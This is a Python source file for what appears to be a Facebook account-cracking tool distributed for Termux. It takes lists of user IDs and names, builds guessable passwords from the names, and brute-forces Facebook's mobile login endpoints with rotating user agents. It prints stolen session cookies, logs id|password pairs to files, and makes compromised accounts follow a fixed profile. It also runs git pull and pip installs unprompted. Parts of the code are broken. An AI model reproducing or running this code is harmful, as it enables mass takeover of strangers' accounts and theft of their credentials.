import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
import platform
import base64
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import getpass

def clear():
#------------------[ DARK-CLR ]-------------------#
    os.system('clear')
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(1)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(1)
os.system("pkg install espeak")
os.system("pip install requests")
os.system("pip install rich")
os.system("pip install bs4")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(1)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(1)
os.system(f'xdg-open https://github.com/Dragon-Lord-404')
print()
attemps = 0
while attemps < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'Dragon' and password == '404':
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mLOGIN SUCCESSFULLY.....')
        os.system('espeak -a 300 " Login, Successfull"')
        time.sleep(2)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect Please Trying ')
        time.sleep(2)
        attemps += 1
        continue

os.system('clear')
#-----[UserAgent]-----
def fetch_and_format_user_agents(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_agents = response.text.split('\n')
            formatted_user_agents = [f"'{ua.strip()}'" for ua in user_agents if ua.strip()]
            return formatted_user_agents
    except:
        pass
    return []
github_user_agents_url = "https://raw.githubusercontent.com/metamorphosis786/ua-file/main/ugen.txt"

ugen = fetch_and_format_user_agents(github_user_agents_url)
#-----[UserAgent2]-----
def fetch_and_format_user_agents(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_agents = response.text.split('\n')
            formatted_user_agents = [f"'{ua.strip()}'" for ua in user_agents if ua.strip()]
            return formatted_user_agents
    except:
        pass
    return []
user2_user_agents_url = "https://raw.githubusercontent.com/metamorphosis786/ua-file/main/ugen2.txt"

ugen2 = fetch_and_format_user_agents(user2_user_agents_url)
try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python FILE.py')

logo=("""
\033[1;91m       ____  ____  ___   __________  _   __
\033[1;92m      / __ \/ __ \/   | / ____/ __ \/ | / /
\033[1;93m     / / / / /_/ / /| |/ / __/ / / /  |/ /    
\033[1;94m    / /_/ / _, _/ ___ / /_/ / /_/ / /|  /      
\033[1;95m   /_____/_/ |_/_/  |_\____/\____/_/ |_/        \033[1;92m
\x1b[1;92m┏───────────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mDRAGON LORD
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mDragon-Lord-404   
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TOOL       \x1b[1;97m: \x1b[1;92mFILE-CLONING      
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m VERSION    \x1b[1;97m: \x1b[1;92m1.0.0
\x1b[1;92m┗───────────────────────────────────────────────┛""")  
def linex():
        print(47*'\033[38;5;46m▬\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            linex()
            print('\033[1;37m[A] FILE CLONING [ON]\n\033[1;37m[B] VISIT MY ACCOUNT\n\033[1;37m[C] CLOSE TOOL')
            linex()
            xd = input('\033[1;37m[➢] CHOOSE : ')
            if xd in ['A', '1']:
                clear()
                print('\033[1;32m[PUT FILE EXAMPLE:  /sdcard/DARK.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [SLOW]\n[2] METHOD 2 [FAST]')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first12')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first11')
                    plist.append('first111')
                    plist.append('first1122')
                    plist.append('first112233')
                    plist.append('first@')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('i love you')
                    plist.append('last')
                    plist.append('last12')
                    plist.append('last123')
                    plist.append('last1234')
                    plist.append('last12345')
                    plist.append('last123456')
                    plist.append('last@')
                    plist.append('last@@')
                    plist.append('last@@@')
                    plist.append('last@@@@')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 20
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[➢]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=50) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[X] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[X] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[X] CRACKING HAS BEEN STARTED")
                    print("""\033[1;91m\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(m1, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(m2, ids, names, passlist)
                print('\033[1;37m')
                linex()
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python FILE.py')
            elif xd in ['B', '2']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['C', '3']:
                exit('BYE BYE Tata Gaya')
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python FILE.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=615507111215074', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a','cs ct', **('string',)).get('href')
        session.get('https://mbasic.facebook.com/a/subscribe.php?id=61550711215074&eav=AfbzZholCsS6B3I6-OeumLl2Hf7kcXwyi_xo0clELfD528Q7wRg9NG1rFu0xJ7LAS5E&gfid=AQDgGuyNTP9jQ7Wn1do&paipv=0&refid=17' + str(get), {
            'cookie': coki }, **('cookies',)).text
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DRAGON•M1] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ua=random.choice(ugen)
        ua2=random.choice(ugen2)
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        session.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = session.get('https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":ids,"flow":"login_no_pin","pass":pas,"next":"https://m.facebook.com/login/save-device/'"}
                        session.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
                        if "c_user" in po:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\033[1;97m[\033[1;96mDRAGON-OK💚\033[1;97m]\033[1;92m '+ids+' • '+ps+'\n\033[0;93m[🍪]= COOKIES • \033[0;92m '+kuki+' ')
                                cek_apk(session,coki)
                                follow(session,coki)
                                open(f'/sdcard/OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in po:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [DRAGON•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/CP•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DRAGON•M2] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ua=random.choice(ugen)
        ua2=random.choice(ugen2)
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        session.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = session.get('https://mbasic.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":ids,"flow":"login_no_pin","pass":pas,"next":"https://mbasic.facebook.com/login/save-device/'"}
                        session.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
                        if "c_user" in open:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\033[1;97m[\033[1;96mDRAGON-OK💚\033[1;97m]\033[1;92m '+ids+' • '+ps+'\n\033[0;93m[🍪]= COOKIES • \033[0;92m '+kuki+' ')
                                cek_apk(session,coki)
                                follow()
                                open(f'/sdcard/OKM2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                follow(session,coki)
                                break
                        elif 'checkpoint' in open:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [DRAGON•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/CPM2.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
#-----[Run Menu]-----#
def superuser():
    UMO="FILE-"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "69".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/god-dark-z/Fake-fun/blob/main/fun.txt").text
    if id in DARK:
        menu()
    else:
        os.system("clear")
        time.sleep(3.0)
        os.system("clear")
        print(logo)
        print("\t\033[30m[\033[1;32m\033[47m NEED APPROVAL\033[00m\033[1;30m]")
        print ("")
        print("\n\033[1;32m│ Note : That is FREE but you need approval to use it │\033[1;37m\n")
        print ("")
        print("               Your Key is Not Approved")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        name = input(" Your Name : ")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https:/wa.me/+8801576593082")
        superuser()        
superuser()
